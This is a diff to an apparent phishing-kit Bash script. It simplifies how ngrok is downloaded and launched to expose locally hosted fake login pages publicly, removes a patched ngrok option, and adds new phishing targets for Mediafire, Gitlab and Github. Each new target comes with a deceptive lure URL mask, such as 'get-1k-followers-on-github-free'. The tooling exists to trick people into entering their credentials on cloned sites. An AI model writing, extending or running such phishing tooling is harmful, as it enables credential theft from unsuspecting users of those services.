@@ -12,7 +12,7 @@
 ##   DarksecDevelopers  - https://github.com/DarksecDevelopers
 ##   Ignitetch  - https://github.com/Ignitetch/AdvPhishing
 ##   Võ Ngọc Bảo - https://github.com/vongocbao
-
+##   Mustakim Ahmed - https://www.facebook.com/Learn.Termux.009
 
 
 ## If you Copy Then Give the credits :)
@@ -137,8 +137,8 @@ kill_pid() {
 	if [[ `pidof php` ]]; then
 		killall php > /dev/null 2>&1
 	fi
-	if [[ `pidof ngrok` || `pidof ngrok2` ]]; then
-		killall ngrok > /dev/null 2>&1 || killall ngrok2 > /dev/null 2>&1
+	if [[ `pidof ngrok` ]]; then
+		killall ngrok > /dev/null 2>&1
 	fi	
 }
 
@@ -172,13 +172,23 @@ banner_small() {
 ## Dependencies
 dependencies() {
 	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing required packages..."
+
+    if [[ -d "/data/data/com.termux/files/home" ]]; then
+        if [[ `command -v proot` ]]; then
+            printf ''
+        else
+			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}proot${CYAN}"${WHITE}
+            pkg install proot resolv-conf -y
+        fi
+    fi
+
 	if [[ `command -v php` && `command -v wget` && `command -v curl` && `command -v unzip` ]]; then
 		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Packages already installed."
 	else
 		pkgs=(php curl wget unzip)
 		for pkg in "${pkgs[@]}"; do
 			type -p "$pkg" &>/dev/null || {
-				echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing packages : ${ORANGE}$pkg${CYAN}"${WHITE}
+				echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}$pkg${CYAN}"${WHITE}
 				if [[ `command -v pkg` ]]; then
 					pkg install "$pkg"
 				elif [[ `command -v apt` ]]; then
@@ -196,6 +206,7 @@ dependencies() {
 			}
 		done
 	fi
+
 }
 
 ## Download Ngrok
@@ -208,9 +219,9 @@ download_ngrok() {
 	wget --no-check-certificate "$url" > /dev/null 2>&1
 	if [[ -e "$file" ]]; then
 		unzip "$file" > /dev/null 2>&1
-		mv -f ngrok .server/"$2" > /dev/null 2>&1
+		mv -f ngrok .server/ngrok > /dev/null 2>&1
 		rm -rf "$file" > /dev/null 2>&1
-		chmod +x .server/"$2" > /dev/null 2>&1
+		chmod +x .server/ngrok > /dev/null 2>&1
 	else
 		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured, Install Ngrok manually."
 		{ reset_color; exit 1; }
@@ -225,31 +236,16 @@ install_ngrok() {
 		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing ngrok..."${WHITE}
 		arch=`uname -m`
 		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
-			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip' 'ngrok'
+			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip'
 		elif [[ "$arch" == *'aarch64'* ]]; then
-			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip' 'ngrok'
+			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip'
 		elif [[ "$arch" == *'x86_64'* ]]; then
-			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip' 'ngrok'
+			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip'
 		else
-			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip' 'ngrok'
+			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip'
 		fi
 	fi
 
-	if [[ -e ".server/ngrok2" ]]; then
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Ngrok patch already installed."
-	else
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing ngrok patch..."${WHITE}
-		arch=`uname -m`
-		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
-			download_ngrok 'https://bin.equinox.io/a/e93TBaoFgZw/ngrok-2.2.8-linux-arm.zip' 'ngrok2'
-		elif [[ "$arch" == *'aarch64'* ]]; then
-			download_ngrok 'https://bin.equinox.io/a/nmkK3DkqZEB/ngrok-2.2.8-linux-arm64.zip' 'ngrok2'
-		elif [[ "$arch" == *'x86_64'* ]]; then
-			download_ngrok 'https://bin.equinox.io/a/kpRGfBMYeTx/ngrok-2.2.8-linux-amd64.zip' 'ngrok2'
-		else
-			download_ngrok 'https://bin.equinox.io/a/4hREUYJSmzd/ngrok-2.2.8-linux-386.zip' 'ngrok2'
-		fi
-	fi
 }
 
 ## Exit message
@@ -268,7 +264,8 @@ about() {
 		${GREEN}Social   ${RED}:  ${CYAN}https://linktr.ee/tahmid.rayat
 		${GREEN}Version  ${RED}:  ${ORANGE}2.1
 
-		${REDBG}${WHITE} Thanks : Adi1090x,MoisesTapia,DarkSecDevelopers,Thelinuxchoice ${RESETBG}
+		${REDBG}${WHITE} Thanks : Adi1090x,MoisesTapia,ThelinuxChoice
+								  DarkSecDevelopers,Mustakim Ahmed ${RESETBG}
 
 		${RED}[${WHITE}00${RED}]${ORANGE} Main Menu     ${RED}[${WHITE}99${RED}]${ORANGE} Exit
 
@@ -343,8 +340,14 @@ capture_data() {
 start_ngrok() {
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	{ sleep 1; setup_site; }
-	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} $2"
-	sleep 2 && ./.server/"$1" http "$HOST":"$PORT" > /dev/null 2>&1 &
+	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Ngrok..."
+
+    if [[ `command -v termux-chroot` ]]; then
+        sleep 2 && termux-chroot ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 & # Thanks to Mustakim Ahmed (https://github.com/BDhackers009)
+    else
+        sleep 2 && ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 &
+    fi
+
 	{ sleep 8; clear; banner_small; }
 	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 	ngrok_url1=${ngrok_url#https://}
@@ -367,9 +370,8 @@ tunnel_menu() {
 	{ clear; banner_small; }
 	cat <<- EOF
 
-		${RED}[${WHITE}01${RED}]${ORANGE} Localhost ${RED}[${CYAN}For Devs Only${RED}]
-		${RED}[${WHITE}02${RED}]${ORANGE} Ngrok.io  ${RED}[${CYAN}Hotspot Required${RED}]
-		${RED}[${WHITE}03${RED}]${ORANGE} Ngrok.io  ${RED}[${CYAN}Without Hotspot${RED}]
+		${RED}[${WHITE}01${RED}]${ORANGE} Localhost ${RED}[${CYAN}For Devs${RED}]
+		${RED}[${WHITE}02${RED}]${ORANGE} Ngrok.io  ${RED}[${CYAN}Best${RED}]
 
 	EOF
 
@@ -378,9 +380,7 @@ tunnel_menu() {
 	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
 		start_localhost
 	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
-		start_ngrok "ngrok" "Launching Ngrok... Turn on Hotspot..."
-	elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
-		start_ngrok "ngrok2" "Launching Ngrok Patched..."
+		start_ngrok
 	else
 		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
 		{ sleep 1; tunnel_menu; }
@@ -528,6 +528,7 @@ main_menu() {
 		${RED}[${WHITE}08${RED}]${ORANGE} Twitter       ${RED}[${WHITE}18${RED}]${ORANGE} Spotify      ${RED}[${WHITE}28${RED}]${ORANGE} StackoverFlow
 		${RED}[${WHITE}09${RED}]${ORANGE} Playstation   ${RED}[${WHITE}19${RED}]${ORANGE} Reddit       ${RED}[${WHITE}29${RED}]${ORANGE} Vk
 		${RED}[${WHITE}10${RED}]${ORANGE} Tiktok        ${RED}[${WHITE}20${RED}]${ORANGE} Adobe        ${RED}[${WHITE}30${RED}]${ORANGE} XBOX
+		${RED}[${WHITE}31${RED}]${ORANGE} Mediafire     ${RED}[${WHITE}32${RED}]${ORANGE} Gitlab       ${RED}[${WHITE}33${RED}]${ORANGE} Github
 
 		${RED}[${WHITE}99${RED}]${ORANGE} About         ${RED}[${WHITE}00${RED}]${ORANGE} Exit
 
@@ -646,6 +647,18 @@ main_menu() {
 	elif [[ "$REPLY" == 30 ]]; then
 		website="xbox"
 		mask='http://get-500-usd-free-to-your-acount'
+		tunnel_menu
+	elif [[ "$REPLY" == 31 ]]; then
+		website="mediafire"
+		mask='http://get-1TB-on-mediafire-free'
+		tunnel_menu
+	elif [[ "$REPLY" == 32 ]]; then
+		website="gitlab"
+		mask='http://get-1k-followers-on-gitlab-free'
+		tunnel_menu
+	elif [[ "$REPLY" == 33 ]]; then
+		website="github"
+		mask='http://get-1k-followers-on-github-free'
 		tunnel_menu
 	elif [[ "$REPLY" == 99 ]]; then
 		about
